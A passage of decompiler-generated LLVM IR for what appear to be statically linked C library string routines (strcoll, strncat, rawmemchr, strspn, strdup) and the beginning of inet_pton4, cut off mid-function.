  %v0_80579a3 = phi i32 [ %v0_80579a3.pre, %dec_label_pc_80579d7.dec_label_pc_80579d9_crit_edge.dec_label_pc_80579a3_crit_edge ], [ %arg3, %dec_label_pc_80579d9.preheader ]
  %v1_80579a3 = add i32 %v0_80579a3, 16
  %v2_80579a3 = inttoptr i32 %v1_80579a3 to i32*
  %v3_80579a3 = load i32, i32* %v2_80579a3, align 4
  store i32 %v3_80579a3, i32* %eax.global-to-local, align 4
  %v2_80579a6 = add i32 %v0_80579a3, 24
  %v3_80579a6 = inttoptr i32 %v2_80579a6 to i32*
  %v4_80579a6 = load i32, i32* %v3_80579a6, align 4
  %v10_80579a6 = icmp ult i32 %v3_80579a3, %v4_80579a6
  %v1_80579a9 = icmp eq i1 %v10_80579a6, false
  br i1 %v1_80579a9, label %dec_label_pc_80579b9, label %dec_label_pc_80579ab

dec_label_pc_80579ab:                             ; preds = %dec_label_pc_80579a3
  %v1_80579ab = inttoptr i32 %v3_80579a3 to i8*
  %v2_80579ab = load i8, i8* %v1_80579ab, align 1
  %v3_80579ab = zext i8 %v2_80579ab to i32
  %v4_80579ab = load i32, i32* @edx, align 4
  %v5_80579ab = and i32 %v4_80579ab, -256
  %v6_80579ab = or i32 %v5_80579ab, %v3_80579ab
  store i32 %v6_80579ab, i32* @edx, align 4
  %v1_80579ad = add i32 %v3_80579a3, 1
  store i32 %v1_80579ad, i32* %eax.global-to-local, align 4
  %v2_80579ae = load i32, i32* @ebx, align 4
  %v3_80579ae = inttoptr i32 %v2_80579ae to i8*
  store i8 %v2_80579ab, i8* %v3_80579ae, align 1
  %v0_80579b0 = load i32, i32* @ebx, align 4
  %v1_80579b0 = add i32 %v0_80579b0, 1
  store i32 %v1_80579b0, i32* @ebx, align 4
  %v0_80579b1 = load i32, i32* @edx, align 4
  %v1_80579b1 = trunc i32 %v0_80579b1 to i8
  %v10_80579b1 = icmp eq i8 %v1_80579b1, 10
  %v0_80579b4 = load i32, i32* %eax.global-to-local, align 4
  %v1_80579b4 = load i32, i32* @ebp, align 4
  %v2_80579b4 = add i32 %v1_80579b4, 16
  %v3_80579b4 = inttoptr i32 %v2_80579b4 to i32*
  store i32 %v0_80579b4, i32* %v3_80579b4, align 4
  br i1 %v10_80579b1, label %dec_label_pc_80579dc, label %dec_label_pc_80579d7.dec_label_pc_80579d9_crit_edge

dec_label_pc_80579b9:                             ; preds = %dec_label_pc_80579a3
  %v0_80579bd = call i32 @getc_unlocked()
  %v1_80579bd = trunc i32 %v0_80579bd to i8
  store i32 %v0_80579bd, i32* %eax.global-to-local, align 4
  %sext = mul i32 %v0_80579bd, 16777216
  %tmp = icmp eq i32 %sext, -16777216
  %v1_80579c8 = icmp eq i1 %tmp, false
  br i1 %v1_80579c8, label %dec_label_pc_80579d7, label %dec_label_pc_80579ca

dec_label_pc_80579ca:                             ; preds = %dec_label_pc_80579b9
  %v0_80579ca = load i32, i32* @ebp, align 4
  %v1_80579ca = inttoptr i32 %v0_80579ca to i8*
  %v2_80579ca = load i8, i8* %v1_80579ca, align 1
  %v3_80579ca = and i8 %v2_80579ca, 8
  %v4_80579ca = icmp eq i8 %v3_80579ca, 0
  br i1 %v4_80579ca, label %dec_label_pc_80579dc, label %dec_label_pc_80579e5

dec_label_pc_80579d7:                             ; preds = %dec_label_pc_80579b9
  %v3_80579d2 = load i32, i32* @ebx, align 4
  %v4_80579d2 = inttoptr i32 %v3_80579d2 to i8*
  store i8 %v1_80579bd, i8* %v4_80579d2, align 1
  %v0_80579d4 = load i32, i32* @ebx, align 4
  %v1_80579d4 = add i32 %v0_80579d4, 1
  store i32 %v1_80579d4, i32* @ebx, align 4
  %v11_80579d5 = icmp eq i8 %v1_80579bd, 10
  br i1 %v11_80579d5, label %dec_label_pc_80579dc, label %dec_label_pc_80579d7.dec_label_pc_80579d9_crit_edge

dec_label_pc_80579d7.dec_label_pc_80579d9_crit_edge: ; preds = %dec_label_pc_80579ab, %dec_label_pc_80579d7
  %v0_80579d9.pre = load i32, i32* @esi, align 4
  %v1_80579d9 = add i32 %v0_80579d9.pre, -1
  %v8_80579d9 = icmp eq i32 %v1_80579d9, 0
  store i32 %v1_80579d9, i32* @esi, align 4
  %v1_80579da = icmp eq i1 %v8_80579d9, false
  br i1 %v1_80579da, label %dec_label_pc_80579d7.dec_label_pc_80579d9_crit_edge.dec_label_pc_80579a3_crit_edge, label %dec_label_pc_80579dc

dec_label_pc_80579d7.dec_label_pc_80579d9_crit_edge.dec_label_pc_80579a3_crit_edge: ; preds = %dec_label_pc_80579d7.dec_label_pc_80579d9_crit_edge
  %v0_80579a3.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_80579a3

dec_label_pc_80579dc:                             ; preds = %dec_label_pc_80579d9.preheader, %dec_label_pc_80579ab, %dec_label_pc_80579d7.dec_label_pc_80579d9_crit_edge, %dec_label_pc_80579d7, %dec_label_pc_80579ca
  %v0_80579dc = load i32, i32* @ebx, align 4
  %v1_80579dc = load i32, i32* @edi, align 4
  %tmp27 = icmp ugt i32 %v0_80579dc, %v1_80579dc
  br i1 %tmp27, label %dec_label_pc_80579e0, label %dec_label_pc_80579e5

dec_label_pc_80579e0:                             ; preds = %dec_label_pc_80579dc
  %v1_80579e0 = inttoptr i32 %v0_80579dc to i8*
  store i8 0, i8* %v1_80579e0, align 1
  %v0_80579ea.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80579e7

dec_label_pc_80579e5:                             ; preds = %dec_label_pc_80579dc, %dec_label_pc_80579ca, %entry
  br label %dec_label_pc_80579e7

dec_label_pc_80579e7:                             ; preds = %dec_label_pc_80579e0, %dec_label_pc_80579e5
  %v0_80579ea = phi i32 [ %v0_80579ea.pre, %dec_label_pc_80579e0 ], [ 0, %dec_label_pc_80579e5 ]
  store i32 %v0_80579ea, i32* %eax.global-to-local, align 4
  store i32 %v0_8057988, i32* @ebp, align 4
  ret i32 %v0_80579ea

; uselistorder directives
  uselistorder i32 %v0_80579ea, { 1, 0 }
  uselistorder i32 %v0_80579dc, { 1, 0 }
  uselistorder i32 %v1_80579d9, { 1, 0 }
  uselistorder i32 %v0_80579bd, { 0, 2, 1 }
  uselistorder i32 %v0_80579a3, { 1, 0 }
  uselistorder i8 10, { 0, 1, 2, 3, 4, 14, 5, 6, 15, 13, 7, 8, 9, 10, 11, 12, 16 }
  uselistorder label %dec_label_pc_80579e7, { 1, 0 }
  uselistorder label %dec_label_pc_80579dc, { 2, 3, 4, 1, 0 }
  uselistorder label %dec_label_pc_80579d7.dec_label_pc_80579d9_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_80579a3, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v4_80579f6 = ptrtoint i8* %arg1 to i32
  %v4_80579fe.pre = load i32, i32* @eax, align 4
  %v8_80579fe.pre = load i1, i1* @df, align 1
  %v9_80579fe = select i1 %v8_80579fe.pre, i32 -1, i32 1
  br label %dec_label_pc_80579fe

dec_label_pc_80579fe:                             ; preds = %dec_label_pc_8057a02, %entry
  %v20_80579ff = phi i32 [ %v23_80579ff, %dec_label_pc_8057a02 ], [ %arg2, %entry ]
  %v4_80579fe = phi i32 [ %v6_80579fe, %dec_label_pc_8057a02 ], [ %v4_80579fe.pre, %entry ]
  %v7_80579fe = phi i32 [ %v10_80579fe, %dec_label_pc_8057a02 ], [ %v4_80579f6, %entry ]
  %v1_80579fe = inttoptr i32 %v7_80579fe to i8*
  %v2_80579fe = load i8, i8* %v1_80579fe, align 1
  %v3_80579ff = inttoptr i32 %v20_80579ff to i8*
  %v4_80579ff = load i8, i8* %v3_80579ff, align 1
  %v15_80579ff = icmp eq i8 %v2_80579fe, %v4_80579ff
  %v1_8057a00 = icmp eq i1 %v15_80579ff, false
  br i1 %v1_8057a00, label %dec_label_pc_8057a0a, label %dec_label_pc_8057a02

dec_label_pc_8057a02:                             ; preds = %dec_label_pc_80579fe
  %v3_80579fe = zext i8 %v2_80579fe to i32
  %v5_80579fe = and i32 %v4_80579fe, -256
  %v6_80579fe = or i32 %v3_80579fe, %v5_80579fe
  %v23_80579ff = add i32 %v20_80579ff, %v9_80579fe
  %v10_80579fe = add i32 %v7_80579fe, %v9_80579fe
  %v4_8057a02 = icmp eq i8 %v2_80579fe, 0
  %v1_8057a04 = icmp eq i1 %v4_8057a02, false
  br i1 %v1_8057a04, label %dec_label_pc_80579fe, label %dec_label_pc_8057a0e

dec_label_pc_8057a0a:                             ; preds = %dec_label_pc_80579fe
  br label %dec_label_pc_8057a0e

dec_label_pc_8057a0e:                             ; preds = %dec_label_pc_8057a02, %dec_label_pc_8057a0a
  %storemerge = phi i32 [ 1, %dec_label_pc_8057a0a ], [ 0, %dec_label_pc_8057a02 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_80579fe, { 1, 2, 0 }
  uselistorder i32 %v9_80579fe, { 1, 0 }
  uselistorder label %dec_label_pc_8057a0e, { 1, 0 }
}

define i32 @__GI_strncat() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8057a17 = load i32, i32* @esi, align 4
  store i32 %v0_8057a17, i32* %stack_var_-8, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v4_8057a1b = ptrtoint i8* %tmp5 to i32
  store i32 %v4_8057a1b, i32* %esi.global-to-local, align 4
  %v4_8057a23 = inttoptr i32 %tmp to i8*
  store i32 %tmp, i32* %edi.global-to-local, align 4
  %v3_8057a27 = call i32 @_strlen(i8* %v4_8057a23)
  %v2_8057a29 = add i32 %tmp, -1
  store i32 %v2_8057a29, i32* %edi.global-to-local, align 4
  %v8_8057a2d13 = icmp eq i32 %tmp4, 0
  store i32 %tmp4, i32* %ecx.global-to-local, align 4
  br i1 %v8_8057a2d13, label %dec_label_pc_8057a38, label %dec_label_pc_8057a30.lr.ph

dec_label_pc_8057a30.lr.ph:                       ; preds = %entry
  %v4_8057a30.pre = load i32, i32* %eax.global-to-local, align 4
  %v8_8057a30.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_8057a30

dec_label_pc_8057a30:                             ; preds = %dec_label_pc_8057a30.lr.ph, %dec_label_pc_8057a30.dec_label_pc_8057a2d_crit_edge
  %v8_8057a30 = phi i1 [ %v8_8057a30.pre, %dec_label_pc_8057a30.lr.ph ], [ %v5_8057a31, %dec_label_pc_8057a30.dec_label_pc_8057a2d_crit_edge ]
  %v4_8057a30 = phi i32 [ %v4_8057a30.pre, %dec_label_pc_8057a30.lr.ph ], [ %v0_8057a32, %dec_label_pc_8057a30.dec_label_pc_8057a2d_crit_edge ]
  %v2_8057a3a15 = phi i32 [ %v2_8057a29, %dec_label_pc_8057a30.lr.ph ], [ %v7_8057a31, %dec_label_pc_8057a30.dec_label_pc_8057a2d_crit_edge ]
  %v0_8057a30 = load i32, i32* %esi.global-to-local, align 4
  %v1_8057a30 = inttoptr i32 %v0_8057a30 to i8*
  %v2_8057a30 = load i8, i8* %v1_8057a30, align 1
  %v3_8057a30 = zext i8 %v2_8057a30 to i32
  %v5_8057a30 = and i32 %v4_8057a30, -256
  %v6_8057a30 = or i32 %v5_8057a30, %v3_8057a30
  store i32 %v6_8057a30, i32* %eax.global-to-local, align 4
  %v9_8057a30 = select i1 %v8_8057a30, i32 -1, i32 1
  %v10_8057a30 = add i32 %v9_8057a30, %v0_8057a30
  store i32 %v10_8057a30, i32* %esi.global-to-local, align 4
  %v3_8057a31 = inttoptr i32 %v2_8057a3a15 to i8*
  store i8 %v2_8057a30, i8* %v3_8057a31, align 1
  %v4_8057a31 = load i32, i32* %edi.global-to-local, align 4
  %v5_8057a31 = load i1, i1* @df, align 1
  %v6_8057a31 = select i1 %v5_8057a31, i32 -1, i32 1
  %v7_8057a31 = add i32 %v6_8057a31, %v4_8057a31
  store i32 %v7_8057a31, i32* %edi.global-to-local, align 4
  %v0_8057a32 = load i32, i32* %eax.global-to-local, align 4
  %v3_8057a32 = trunc i32 %v0_8057a32 to i8
  %v4_8057a32 = icmp eq i8 %v3_8057a32, 0
  %v1_8057a34 = icmp eq i1 %v4_8057a32, false
  br i1 %v1_8057a34, label %dec_label_pc_8057a30.dec_label_pc_8057a2d_crit_edge, label %dec_label_pc_8057a3b

dec_label_pc_8057a30.dec_label_pc_8057a2d_crit_edge: ; preds = %dec_label_pc_8057a30
  %v0_8057a2d.pre = load i32, i32* %ecx.global-to-local, align 4
  %v1_8057a2d = add i32 %v0_8057a2d.pre, -1
  %v8_8057a2d = icmp eq i32 %v1_8057a2d, 0
  store i32 %v1_8057a2d, i32* %ecx.global-to-local, align 4
  br i1 %v8_8057a2d, label %dec_label_pc_8057a38, label %dec_label_pc_8057a30

dec_label_pc_8057a38:                             ; preds = %dec_label_pc_8057a30.dec_label_pc_8057a2d_crit_edge, %entry
  %v2_8057a3a.lcssa = phi i32 [ %v2_8057a29, %entry ], [ %v7_8057a31, %dec_label_pc_8057a30.dec_label_pc_8057a2d_crit_edge ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_8057a3a = inttoptr i32 %v2_8057a3a.lcssa to i8*
  store i8 0, i8* %v3_8057a3a, align 1
  %v4_8057a3a = load i32, i32* %edi.global-to-local, align 4
  %v5_8057a3a = load i1, i1* @df, align 1
  %v6_8057a3a = select i1 %v5_8057a3a, i32 -1, i32 1
  %v7_8057a3a = add i32 %v6_8057a3a, %v4_8057a3a
  store i32 %v7_8057a3a, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8057a3b

dec_label_pc_8057a3b:                             ; preds = %dec_label_pc_8057a30, %dec_label_pc_8057a38
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v2_8057a3f = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8057a3f, i32* @esi, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v1_8057a2d, { 1, 0 }
  uselistorder i32 %v0_8057a32, { 1, 0 }
  uselistorder i32 %v7_8057a31, { 0, 2, 1 }
  uselistorder i1 %v5_8057a31, { 1, 0 }
  uselistorder i32 %tmp4, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 0, 1, 2 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8057a3b, { 1, 0 }
  uselistorder label %dec_label_pc_8057a30, { 1, 0 }
}

define i32 @rawmemchr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8057a45 = load i32, i32* @ebx, align 4
  %v4_8057a46 = urem i32 %arg2, 256
  %v4_8057a4a = ptrtoint i8* %arg1 to i32
  %v2_8057a553 = urem i32 %v4_8057a4a, 4
  %v3_8057a554 = icmp eq i32 %v2_8057a553, 0
  %v1_8057a578 = icmp eq i1 %v3_8057a554, false
  %v4_8057a50 = trunc i32 %arg2 to i8
  br i1 %v1_8057a578, label %dec_label_pc_8057a50, label %dec_label_pc_8057a59

dec_label_pc_8057a50:                             ; preds = %entry, %dec_label_pc_8057a54
  %v0_8057a54 = phi i32 [ %v1_8057a54, %dec_label_pc_8057a54 ], [ %v4_8057a4a, %entry ]
  %v1_8057a50 = inttoptr i32 %v0_8057a54 to i8*
  %v2_8057a50 = load i8, i8* %v1_8057a50, align 1
  %v15_8057a50 = icmp eq i8 %v2_8057a50, %v4_8057a50
  br i1 %v15_8057a50, label %dec_label_pc_8057aa4, label %dec_label_pc_8057a54

dec_label_pc_8057a54:                             ; preds = %dec_label_pc_8057a50
  %v1_8057a54 = add i32 %v0_8057a54, 1
  %v2_8057a55 = urem i32 %v1_8057a54, 4
  %v3_8057a55 = icmp eq i32 %v2_8057a55, 0
  %v1_8057a57 = icmp eq i1 %v3_8057a55, false
  br i1 %v1_8057a57, label %dec_label_pc_8057a50, label %dec_label_pc_8057a59

dec_label_pc_8057a59:                             ; preds = %entry, %dec_label_pc_8057a54
  %v0_8057a5c = phi i32 [ %v1_8057a54, %dec_label_pc_8057a54 ], [ %v4_8057a4a, %entry ]
  %v2_8057a60 = mul nuw nsw i32 %v4_8057a46, 256
  %v2_8057a63 = or i32 %v2_8057a60, %v4_8057a46
  %v2_8057a67 = mul i32 %v2_8057a63, 65536
  %v2_8057a6a = or i32 %v2_8057a67, %v2_8057a63
  br label %dec_label_pc_8057a6c

dec_label_pc_8057a6c:                             ; preds = %dec_label_pc_8057a9c, %dec_label_pc_8057a6c, %dec_label_pc_8057a59
  %v0_8057a70 = phi i32 [ %v0_8057a5c, %dec_label_pc_8057a59 ], [ %v1_8057a70, %dec_label_pc_8057a6c ], [ %v1_8057a70, %dec_label_pc_8057a9c ]
  %v2_8057a6e = inttoptr i32 %v0_8057a70 to i32*
  %v3_8057a6e = load i32, i32* %v2_8057a6e, align 4
  %v4_8057a6e = xor i32 %v3_8057a6e, %v2_8057a6a
  %v1_8057a70 = add i32 %v0_8057a70, 4
  store i32 %v1_8057a70, i32* @ecx, align 4
  %v1_8057a73 = add i32 %v4_8057a6e, 2130640639
  %v1_8057a79 = sub i32 -1, %v4_8057a6e
  store i32 %v1_8057a79, i32* @edx, align 4
  %v2_8057a7b = xor i32 %v1_8057a73, %v1_8057a79
  %v1_8057a7d = and i32 %v2_8057a7b, -2130640640
  %v2_8057a7d = icmp eq i32 %v1_8057a7d, 0
  br i1 %v2_8057a7d, label %dec_label_pc_8057a6c, label %dec_label_pc_8057a84

dec_label_pc_8057a84:                             ; preds = %dec_label_pc_8057a6c
  %v2_8057a84 = inttoptr i32 %v0_8057a70 to i8*
  %v3_8057a84 = load i8, i8* %v2_8057a84, align 1
  %v16_8057a84 = icmp eq i8 %v3_8057a84, %v4_8057a50
  br i1 %v16_8057a84, label %dec_label_pc_8057aa4, label %dec_label_pc_8057a8c

dec_label_pc_8057a8c:                             ; preds = %dec_label_pc_8057a84
  %v1_8057a8c = add i32 %v0_8057a70, 1
  %v2_8057a8c = inttoptr i32 %v1_8057a8c to i8*
  %v3_8057a8c = load i8, i8* %v2_8057a8c, align 1
  %v16_8057a8c = icmp eq i8 %v3_8057a8c, %v4_8057a50
  br i1 %v16_8057a8c, label %dec_label_pc_8057aa4, label %dec_label_pc_8057a94

dec_label_pc_8057a94:                             ; preds = %dec_label_pc_8057a8c
  %v1_8057a94 = add i32 %v0_8057a70, 2
  %v2_8057a94 = inttoptr i32 %v1_8057a94 to i8*
  %v3_8057a94 = load i8, i8* %v2_8057a94, align 1
  %v16_8057a94 = icmp eq i8 %v3_8057a94, %v4_8057a50
  br i1 %v16_8057a94, label %dec_label_pc_8057aa4, label %dec_label_pc_8057a9c

dec_label_pc_8057a9c:                             ; preds = %dec_label_pc_8057a94
  %v1_8057a9c = add i32 %v0_8057a70, 3
  %v2_8057a9c = inttoptr i32 %v1_8057a9c to i8*
  %v3_8057a9c = load i8, i8* %v2_8057a9c, align 1
  %v16_8057a9c = icmp eq i8 %v3_8057a9c, %v4_8057a50
  %v1_8057aa2 = icmp eq i1 %v16_8057a9c, false
  br i1 %v1_8057aa2, label %dec_label_pc_8057a6c, label %dec_label_pc_8057aa4

dec_label_pc_8057aa4:                             ; preds = %dec_label_pc_8057a50, %dec_label_pc_8057a9c, %dec_label_pc_8057a94, %dec_label_pc_8057a8c, %dec_label_pc_8057a84
  %v0_8057aa6 = phi i32 [ %v1_8057a9c, %dec_label_pc_8057a9c ], [ %v1_8057a94, %dec_label_pc_8057a94 ], [ %v1_8057a8c, %dec_label_pc_8057a8c ], [ %v0_8057a70, %dec_label_pc_8057a84 ], [ %v0_8057a54, %dec_label_pc_8057a50 ]
  store i32 %v0_8057a45, i32* @ebx, align 4
  ret i32 %v0_8057aa6

; uselistorder directives
  uselistorder i32 %v1_8057a79, { 1, 0 }
  uselistorder i32 %v1_8057a70, { 2, 1, 0 }
  uselistorder i32 %v2_8057a63, { 1, 0 }
  uselistorder i32 %v1_8057a54, { 1, 0, 2 }
  uselistorder i8 %v4_8057a50, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v4_8057a4a, { 2, 1, 0 }
  uselistorder i32 %v4_8057a46, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8057aa4, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_8057a59, { 1, 0 }
  uselistorder label %dec_label_pc_8057a50, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_8057aca31 = load i8, i8* %arg1, align 1
  %v4_8057acc35 = icmp eq i8 %v2_8057aca31, 0
  br i1 %v4_8057acc35, label %dec_label_pc_8057ad4, label %dec_label_pc_8057ad0.lr.ph

dec_label_pc_8057ad0.lr.ph:                       ; preds = %entry
  %v3_8057aca32 = zext i8 %v2_8057aca31 to i32
  %v4_8057aca.pre = load i32, i32* @eax, align 4
  %v5_8057aca33 = and i32 %v4_8057aca.pre, -256
  %v6_8057aca34 = or i32 %v3_8057aca32, %v5_8057aca33
  %v4_8057ab1 = ptrtoint i8* %arg1 to i32
  %v1_8057abc18 = inttoptr i32 %arg2 to i8*
  %v4_8057abc.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8057ad0

dec_label_pc_8057ab7:                             ; preds = %dec_label_pc_8057ad0, %dec_label_pc_8057abb
  %v6_8057abc28 = phi i32 [ %v6_8057abc, %dec_label_pc_8057abb ], [ %v6_8057abc22, %dec_label_pc_8057ad0 ]
  %v2_8057abc27 = phi i8 [ %v2_8057abc, %dec_label_pc_8057abb ], [ %v2_8057abc19, %dec_label_pc_8057ad0 ]
  %v0_8057abb26 = phi i32 [ %v1_8057abb, %dec_label_pc_8057abb ], [ %arg2, %dec_label_pc_8057ad0 ]
  %v15_8057ab7 = icmp eq i8 %v2_8057aca39, %v2_8057abc27
  br i1 %v15_8057ab7, label %dec_label_pc_8057ac4, label %dec_label_pc_8057abb

dec_label_pc_8057abb:                             ; preds = %dec_label_pc_8057ab7
  %v1_8057abb = add i32 %v0_8057abb26, 1
  store i32 %v1_8057abb, i32* @edx, align 4
  %v1_8057abc = inttoptr i32 %v1_8057abb to i8*
  %v2_8057abc = load i8, i8* %v1_8057abc, align 1
  %v3_8057abc = zext i8 %v2_8057abc to i32
  %v5_8057abc = and i32 %v6_8057abc28, -256
  %v6_8057abc = or i32 %v3_8057abc, %v5_8057abc
  store i32 %v6_8057abc, i32* @ecx, align 4
  %v4_8057abe = icmp eq i8 %v2_8057abc, 0
  %v1_8057ac0 = icmp eq i1 %v4_8057abe, false
  br i1 %v1_8057ac0, label %dec_label_pc_8057ab7, label %dec_label_pc_8057ad4

dec_label_pc_8057ac4:                             ; preds = %dec_label_pc_8057ab7
  %v1_8057ac8 = add i32 %v0_8057ad537, 1
  %v1_8057ac9 = add i32 %v0_8057ac938, 1
  %v1_8057aca = inttoptr i32 %v1_8057ac9 to i8*
  %v2_8057aca = load i8, i8* %v1_8057aca, align 1
  %v3_8057aca = zext i8 %v2_8057aca to i32
  %v5_8057aca = and i32 %v6_8057aca40, -256
  %v6_8057aca = or i32 %v3_8057aca, %v5_8057aca
  %v4_8057acc = icmp eq i8 %v2_8057aca, 0
  br i1 %v4_8057acc, label %dec_label_pc_8057ad4, label %dec_label_pc_8057ad0

dec_label_pc_8057ad0:                             ; preds = %dec_label_pc_8057ad0.lr.ph, %dec_label_pc_8057ac4
  %v4_8057abc.pre = phi i32 [ %v4_8057abc.pre.pre, %dec_label_pc_8057ad0.lr.ph ], [ %v6_8057abc28, %dec_label_pc_8057ac4 ]
  %v6_8057aca40 = phi i32 [ %v6_8057aca34, %dec_label_pc_8057ad0.lr.ph ], [ %v6_8057aca, %dec_label_pc_8057ac4 ]
  %v2_8057aca39 = phi i8 [ %v2_8057aca31, %dec_label_pc_8057ad0.lr.ph ], [ %v2_8057aca, %dec_label_pc_8057ac4 ]
  %v0_8057ac938 = phi i32 [ %v4_8057ab1, %dec_label_pc_8057ad0.lr.ph ], [ %v1_8057ac9, %dec_label_pc_8057ac4 ]
  %v0_8057ad537 = phi i32 [ 0, %dec_label_pc_8057ad0.lr.ph ], [ %v1_8057ac8, %dec_label_pc_8057ac4 ]
  store i32 %arg2, i32* @edx, align 4
  %v2_8057abc19 = load i8, i8* %v1_8057abc18, align 1
  %v3_8057abc20 = zext i8 %v2_8057abc19 to i32
  %v5_8057abc21 = and i32 %v4_8057abc.pre, -256
  %v6_8057abc22 = or i32 %v3_8057abc20, %v5_8057abc21
  store i32 %v6_8057abc22, i32* @ecx, align 4
  %v4_8057abe23 = icmp eq i8 %v2_8057abc19, 0
  %v1_8057ac025 = icmp eq i1 %v4_8057abe23, false
  br i1 %v1_8057ac025, label %dec_label_pc_8057ab7, label %dec_label_pc_8057ad4

dec_label_pc_8057ad4:                             ; preds = %entry, %dec_label_pc_8057ac4, %dec_label_pc_8057ad0, %dec_label_pc_8057abb
  %v0_8057ad517 = phi i32 [ %v0_8057ad537, %dec_label_pc_8057abb ], [ %v0_8057ad537, %dec_label_pc_8057ad0 ], [ 0, %entry ], [ %v1_8057ac8, %dec_label_pc_8057ac4 ]
  ret i32 %v0_8057ad517

; uselistorder directives
  uselistorder i32 %v6_8057abc22, { 1, 0 }
  uselistorder i8 %v2_8057abc19, { 1, 2, 0 }
  uselistorder i32 %v1_8057ac9, { 1, 0 }
  uselistorder i32 %v6_8057abc, { 1, 0 }
  uselistorder i8 %v2_8057abc, { 1, 2, 0 }
  uselistorder i32 %v1_8057abb, { 2, 1, 0 }
  uselistorder i8 %v2_8057aca31, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8057ad4, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_8057ad0, { 1, 0 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8057adc = load i32, i32* @edi, align 4
  %v0_8057add = load i32, i32* @esi, align 4
  %v0_8057ade = load i32, i32* @ebx, align 4
  store i32 %v0_8057ade, i32* %stack_var_-12, align 4
  %v4_8057adf = ptrtoint i8* %arg1 to i32
  store i32 %v4_8057adf, i32* @edi, align 4
  %v3_8057ae7 = call i32 @strlen(i8* %arg1)
  %v1_8057aec = add i32 %v3_8057ae7, 1
  store i32 %v1_8057aec, i32* @esi, align 4
  %v2_8057af2 = call i32 @malloc(i32 %v1_8057aec)
  %v1_8057afa = icmp eq i32 %v2_8057af2, 0
  store i32 %v2_8057af2, i32* %ebx.global-to-local, align 4
  br i1 %v1_8057afa, label %dec_label_pc_8057b0c, label %dec_label_pc_8057b00

dec_label_pc_8057b00:                             ; preds = %entry
  %v0_8057b01 = load i32, i32* @esi, align 4
  %v0_8057b02 = load i32, i32* @edi, align 4
  %tmp11 = inttoptr i32 %v2_8057af2 to i16*
  %v6_8057b04 = call i32 @memcpy(i16* %tmp11, i32 %v0_8057b02, i32 %v0_8057b01)
  %v0_8057b0c.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8057b0c

dec_label_pc_8057b0c:                             ; preds = %entry, %dec_label_pc_8057b00
  %v0_8057b0c = phi i32 [ 0, %entry ], [ %v0_8057b0c.pre, %dec_label_pc_8057b00 ]
  %v2_8057b0e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8057b0e, i32* @ebx, align 4
  store i32 %v0_8057add, i32* @esi, align 4
  store i32 %v0_8057adc, i32* @edi, align 4
  ret i32 %v0_8057b0c

; uselistorder directives
  uselistorder i32 %v2_8057af2, { 0, 2, 1 }
  uselistorder i32 (i32)* @malloc, { 8, 7, 6, 5, 4, 1, 15, 14, 13, 12, 11, 10, 3, 9, 2, 0 }
  uselistorder label %dec_label_pc_8057b0c, { 1, 0 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 0, i32* @edx, align 4
  %v0_8057b1a = load i32, i32* @esi, align 4
  store i32 0, i32* @edi, align 4
  %v0_8057b1d = load i32, i32* @ebx, align 4
  store i32 %v0_8057b1d, i32* %stack_var_-16, align 4
  %v0_8057b1e = load i32, i32* @eax, align 4
  store i32 %v0_8057b1e, i32* %ebx.global-to-local, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  %v15_8057b20 = ptrtoint i32* %stack_var_-44 to i32
  %v2_8057b23 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8057b23, i32* @esi, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v1_8057b6b15 = inttoptr i32 %v0_8057b1e to i8*
  %v2_8057b6b16 = load i8, i8* %v1_8057b6b15, align 1
  %v3_8057b6b17 = sext i8 %v2_8057b6b16 to i32
  store i32 %v3_8057b6b17, i32* @ecx, align 4
  %v1_8057b6e18 = add i32 %v0_8057b1e, 1
  store i32 %v1_8057b6e18, i32* %ebx.global-to-local, align 4
  %v1_8057b6f19 = icmp eq i8 %v2_8057b6b16, 0
